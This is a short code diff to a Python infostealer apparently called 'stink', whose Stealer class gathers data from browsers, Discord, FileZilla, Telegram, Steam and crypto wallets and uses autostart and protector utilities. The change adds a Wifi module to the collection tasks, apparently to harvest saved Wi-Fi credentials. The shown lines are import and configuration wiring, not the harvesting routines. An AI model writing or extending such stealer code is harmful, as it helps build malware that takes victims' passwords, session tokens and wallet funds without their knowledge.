@@ -9,8 +9,7 @@ from stink.enums import Features, Utils, Protectors
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
 from stink.utils import Autostart, Message, Protector, Loader, Grabber
-from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
-
+from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets, Wifi
 
 class Stealer(Thread):
     """
@@ -153,6 +152,13 @@ class Stealer(Thread):
                     "System",
                 ),
                 "status": Features.processes in features or Features.all in features
+            },
+            {
+                "object": Wifi,
+                "arguments": (
+                    "System",
+                ),
+                "status": Features.wifi in features or Features.all in features
             },
             {
                 "object": Screenshot,
